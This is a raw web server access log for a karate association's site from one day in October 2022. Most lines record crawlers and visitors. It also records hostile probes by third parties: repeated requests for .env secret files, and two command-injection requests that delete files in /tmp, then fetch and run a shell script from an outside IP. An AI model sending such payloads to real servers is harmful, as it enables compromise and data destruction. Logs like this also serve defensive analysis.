::ffff:40.77.167.70 - - [03/Oct/2022:10:04:49 +0000] "GET /images/books/shotokanSecrets.jpg HTTP/1.1" 200 4046 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:64.62.197.197 - - [03/Oct/2022:10:10:29 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"
::ffff:159.8.122.153 - - [03/Oct/2022:10:12:06 +0000] "GET /style.php?sig=rename HTTP/1.1" 404 148 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 YaBrowser/21.3.3.230 Yowser/2.5 Safari/537.36"
::ffff:216.244.66.196 - - [03/Oct/2022:10:26:19 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
::ffff:216.244.66.196 - - [03/Oct/2022:10:27:55 +0000] "GET /gallery HTTP/1.1" 404 146 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
::ffff:114.119.152.128 - - [03/Oct/2022:10:39:52 +0000] "GET /joinemail?type=blackbeltclasses HTTP/1.1" 200 8998 "https://wadokikai.org/events" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:95.214.235.205 - - [03/Oct/2022:10:48:33 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:95.214.235.205 - - [03/Oct/2022:10:48:33 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:157.55.39.137 - - [03/Oct/2022:10:56:41 +0000] "GET /instructors.html HTTP/1.1" 404 155 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:45.79.171.66 - - [03/Oct/2022:10:59:02 +0000] "GET /service.php?token=1819&action=11 HTTP/1.0" 404 150 "-" "-"
::ffff:135.125.246.189 - - [03/Oct/2022:11:11:52 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.189 - - [03/Oct/2022:11:11:52 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:114.119.145.212 - - [03/Oct/2022:11:12:02 +0000] "GET /contact?s=1&ss=4 HTTP/1.1" 200 9997 "http://34.212.47.6/schools" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:216.244.66.196 - - [03/Oct/2022:11:18:14 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
::ffff:216.244.66.196 - - [03/Oct/2022:11:19:32 +0000] "GET /joinemail?type=promotions HTTP/1.1" 200 8841 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
::ffff:71.6.232.2 - - [03/Oct/2022:11:19:59 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36"
::ffff:157.55.39.228 - - [03/Oct/2022:11:31:48 +0000] "GET /images/instructors/geoffrey.jpg HTTP/1.1" 200 14922 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:207.46.13.198 - - [03/Oct/2022:11:37:54 +0000] "GET /images/instructors/jorge8th.jpg HTTP/1.1" 200 121759 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:207.46.13.135 - - [03/Oct/2022:11:38:07 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:157.55.39.137 - - [03/Oct/2022:12:08:57 +0000] "GET /images/igpic.webp HTTP/1.1" 200 1328 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:157.55.39.137 - - [03/Oct/2022:12:25:39 +0000] "GET /images/schools/manzanitakaratedo.jpg HTTP/1.1" 200 1829058 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:114.119.135.193 - - [03/Oct/2022:12:40:11 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:20.52.4.75 - - [03/Oct/2022:12:40:37 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:20.52.4.75 - - [03/Oct/2022:12:40:37 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.189 - - [03/Oct/2022:12:45:39 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.189 - - [03/Oct/2022:12:45:39 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:167.94.145.57 - - [03/Oct/2022:12:50:33 +0000] "GET / HTTP/1.1" 200 58140 "-" "-"
::ffff:167.94.145.57 - - [03/Oct/2022:12:50:33 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:167.94.145.57 - - [03/Oct/2022:12:50:33 +0000] "PRI * HTTP/2.0" - - "-" "-"
::ffff:167.94.145.57 - - [03/Oct/2022:12:50:34 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:167.94.145.57 - - [03/Oct/2022:12:50:34 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:40.77.167.70 - - [03/Oct/2022:12:58:26 +0000] "GET /images/instructors/mlee.jpg HTTP/1.1" 200 65525 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:138.68.167.100 - - [03/Oct/2022:12:59:17 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:157.55.39.86 - - [03/Oct/2022:13:01:23 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:207.46.13.135 - - [03/Oct/2022:13:01:26 +0000] "GET /resources HTTP/1.1" 200 194907 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:207.46.13.198 - - [03/Oct/2022:13:01:41 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:207.46.13.198 - - [03/Oct/2022:13:01:41 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:35.85.143.100 - - [03/Oct/2022:13:01:55 +0000] "GET / HTTP/1.1" 200 58140 "-" "-"
::ffff:122.118.29.9 - - [03/Oct/2022:13:05:27 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
::ffff:24.130.163.120 - - [03/Oct/2022:13:13:20 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
::ffff:24.130.163.120 - - [03/Oct/2022:13:13:20 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "https://wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
::ffff:24.130.163.120 - - [03/Oct/2022:13:13:20 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 200 32301 "https://wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
::ffff:24.130.163.120 - - [03/Oct/2022:13:13:20 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "https://wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
::ffff:24.130.163.120 - - [03/Oct/2022:13:13:20 +0000] "GET /images/schools/alamedakaratedomap.jpg HTTP/1.1" 200 38311 "https://wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
::ffff:24.130.163.120 - - [03/Oct/2022:13:13:20 +0000] "GET /images/schools/dcakaratedomap.jpg HTTP/1.1" 200 35262 "https://wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
::ffff:24.130.163.120 - - [03/Oct/2022:13:13:20 +0000] "GET /images/schools/orindakaratedomap.jpg HTTP/1.1" 200 34167 "https://wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
::ffff:24.130.163.120 - - [03/Oct/2022:13:13:20 +0000] "GET /images/schools/harborbaykaratedomap.jpg HTTP/1.1" 200 37245 "https://wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
::ffff:24.130.163.120 - - [03/Oct/2022:13:13:20 +0000] "GET /images/schools/corpuzkaratedomap.jpg HTTP/1.1" 200 36421 "https://wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
::ffff:24.130.163.120 - - [03/Oct/2022:13:13:20 +0000] "GET /images/schools/nunleykaratedomap.jpg HTTP/1.1" 200 42667 "https://wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
::ffff:24.130.163.120 - - [03/Oct/2022:13:13:20 +0000] "GET /images/schools/marinkaratedomap.jpg HTTP/1.1" 200 32400 "https://wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
::ffff:24.130.163.120 - - [03/Oct/2022:13:13:20 +0000] "GET /images/schools/manzanitakaratedomap.jpg HTTP/1.1" 200 55402 "https://wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
::ffff:24.130.163.120 - - [03/Oct/2022:13:13:20 +0000] "GET /images/dragon-trans.png HTTP/1.1" 200 85661 "https://wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
::ffff:24.130.163.120 - - [03/Oct/2022:13:13:20 +0000] "GET /images/schools/earhartkaratedomap.jpg HTTP/1.1" 200 41366 "https://wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
::ffff:24.130.163.120 - - [03/Oct/2022:13:13:20 +0000] "GET /images/schools/martinezkaratedomap.jpg HTTP/1.1" 200 37724 "https://wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
::ffff:24.130.163.120 - - [03/Oct/2022:13:13:20 +0000] "GET /images/promotions/AFSPrelimSchedule.pdf HTTP/1.1" 200 57396 "https://wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
::ffff:24.130.163.120 - - [03/Oct/2022:13:13:24 +0000] "GET /images/tiger.bmp HTTP/1.1" 200 311274 "https://wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
::ffff:24.130.163.120 - - [03/Oct/2022:13:13:27 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 200 35066 "https://wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
::ffff:24.130.163.120 - - [03/Oct/2022:13:13:31 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "https://wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
::ffff:135.125.246.189 - - [03/Oct/2022:13:14:53 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.189 - - [03/Oct/2022:13:14:54 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:34.78.6.216 - - [03/Oct/2022:13:35:15 +0000] "GET / HTTP/1.1" 200 58140 "-" "python-requests/2.28.1"
::ffff:17.121.113.136 - - [03/Oct/2022:13:41:06 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)"
::ffff:17.121.113.136 - - [03/Oct/2022:13:41:07 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)"
::ffff:167.172.252.204 - - [03/Oct/2022:13:41:08 +0000] "GET / HTTP/1.0" 200 58140 "-" "Mozilla/5.0 (compatible; NetcraftSurveyAgent/1.0; +info@netcraft.com)"
::ffff:66.249.72.231 - - [03/Oct/2022:13:51:17 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.72.230 - - [03/Oct/2022:13:51:17 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.72.227 - - [03/Oct/2022:13:51:17 +0000] "GET /ads.txt HTTP/1.1" 404 146 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.72.232 - - [03/Oct/2022:13:51:18 +0000] "GET /ads.txt HTTP/1.1" 404 146 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:40.77.167.70 - - [03/Oct/2022:13:51:51 +0000] "GET /images/instructors/don.jpg HTTP/1.1" 200 76210 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:180.241.44.246 - - [03/Oct/2022:13:56:44 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
::ffff:114.119.135.181 - - [03/Oct/2022:13:57:40 +0000] "GET /joinemail?type=tournaments HTTP/1.1" 200 8829 "http://www.wadokikai.net/events" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:1.14.170.35 - - [03/Oct/2022:14:13:09 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+79.110.62.227/lol.sh;sh+/tmp/lol.sh HTTP/1.1" - - "-" "Hello, world"
::ffff:35.90.60.5 - - [03/Oct/2022:14:24:27 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:35.164.90.254 - - [03/Oct/2022:14:24:54 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:35.164.90.254 - - [03/Oct/2022:14:24:55 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:114.119.152.12 - - [03/Oct/2022:14:32:25 +0000] "GET /contact?s=1&ss=5 HTTP/1.1" 200 9997 "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:94.247.172.129 - - [03/Oct/2022:14:43:47 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2)"
::ffff:37.139.53.82 - - [03/Oct/2022:14:54:52 +0000] "GET / HTTP/1.0" 200 58140 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
::ffff:37.139.53.82 - - [03/Oct/2022:14:54:52 +0000] "POST /sendemail HTTP/1.0" 302 40 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
::ffff:37.139.53.82 - - [03/Oct/2022:14:54:53 +0000] "GET /?err=error HTTP/1.0" 200 58692 "http://wadokikai.org/?err=error#signup" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
::ffff:135.125.246.189 - - [03/Oct/2022:15:00:06 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.189 - - [03/Oct/2022:15:00:06 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:37.139.53.82 - - [03/Oct/2022:15:01:00 +0000] "GET / HTTP/1.0" 200 58140 "http://wadokikai.net/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
::ffff:37.139.53.82 - - [03/Oct/2022:15:01:00 +0000] "POST /sendemail HTTP/1.0" 302 40 "http://wadokikai.net/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
::ffff:37.139.53.82 - - [03/Oct/2022:15:01:01 +0000] "GET /?err=error HTTP/1.0" 200 58692 "http://wadokikai.net/?err=error#signup" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
::ffff:157.55.39.207 - - [03/Oct/2022:15:02:47 +0000] "GET /images/schools/earhartkaratedo.jpg HTTP/1.1" 200 35835 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:99.92.92.199 - - [03/Oct/2022:15:06:48 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:99.92.92.199 - - [03/Oct/2022:15:06:51 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:43.132.196.160 - - [03/Oct/2022:15:10:05 +0000] "GET / HTTP/1.1" 200 58140 "-" "'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0'"
::ffff:114.119.130.218 - - [03/Oct/2022:15:13:32 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:114.119.128.244 - - [03/Oct/2022:15:13:58 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:169.199.80.102 - - [03/Oct/2022:15:23:41 +0000] "GET /images/instructors/anunley.jpg HTTP/1.1" 200 32690 "https://www.google.com/" "Mozilla/5.0 (X11; CrOS x86_64 14816.131.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:169.199.80.102 - - [03/Oct/2022:15:23:51 +0000] "GET /images/instructors/anunley.jpg HTTP/1.1" 304 - "https://www.google.com/" "Mozilla/5.0 (X11; CrOS x86_64 14816.131.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:40.77.167.70 - - [03/Oct/2022:15:25:10 +0000] "GET /images/books/MBS2.jpg HTTP/1.1" 200 15317 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:73.231.249.115 - - [03/Oct/2022:15:29:24 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://www.wadokikai.net/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:73.231.249.115 - - [03/Oct/2022:15:35:55 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://www.wadokikai.net/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:99.92.92.199 - - [03/Oct/2022:15:49:37 +0000] "GET /images/dragon-trans.png HTTP/1.1" 200 85661 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:99.92.92.199 - - [03/Oct/2022:15:50:37 +0000] "GET /images/tiger.bmp HTTP/1.1" 200 311274 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:46.19.141.122 - - [03/Oct/2022:15:50:54 +0000] "GET / HTTP/1.1" 200 58140 "-" "-"
::ffff:46.19.141.122 - - [03/Oct/2022:15:50:58 +0000] "POST /HNAP1/ HTTP/1.1" 404 146 "-" "Mozila/5.0"
::ffff:1.14.170.35 - - [03/Oct/2022:15:53:04 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+79.110.62.227/lol.sh;sh+/tmp/lol.sh HTTP/1.1" - - "-" "Hello, world"
::ffff:45.79.171.66 - - [03/Oct/2022:16:01:43 +0000] "GET /service.php?token=1819&action=11 HTTP/1.0" 404 150 "-" "-"
::ffff:66.249.75.216 - - [03/Oct/2022:16:09:55 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.75.214 - - [03/Oct/2022:16:09:55 +0000] "GET /docs/Self-DefenseAwarenessInfo.pdf HTTP/1.1" 404 173 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
::ffff:192.241.214.101 - - [03/Oct/2022:16:13:48 +0000] "GET /manager/text/list HTTP/1.1" 404 156 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:66.249.75.216 - - [03/Oct/2022:16:19:36 +0000] "GET /prelims/MSACFall2018Promotional.pdf HTTP/1.1" 404 174 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
::ffff:157.55.39.207 - - [03/Oct/2022:16:21:24 +0000] "GET /images/instructors/SenseiLarry.jpg HTTP/1.1" 200 60380 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:128.199.107.27 - - [03/Oct/2022:16:26:33 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:167.94.145.58 - - [03/Oct/2022:16:34:45 +0000] "GET / HTTP/1.1" 200 58140 "-" "-"
::ffff:167.94.145.58 - - [03/Oct/2022:16:34:46 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:167.94.145.58 - - [03/Oct/2022:16:34:47 +0000] "PRI * HTTP/2.0" - - "-" "-"
::ffff:167.94.145.58 - - [03/Oct/2022:16:34:47 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:167.94.145.58 - - [03/Oct/2022:16:34:48 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:66.249.75.212 - - [03/Oct/2022:16:47:22 +0000] "GET /ads.txt HTTP/1.1" 404 146 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.75.194 - - [03/Oct/2022:16:47:22 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.75.221 - - [03/Oct/2022:16:47:22 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.75.204 - - [03/Oct/2022:16:47:22 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.75.221 - - [03/Oct/2022:16:47:22 +0000] "GET /ads.txt HTTP/1.1" 404 146 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
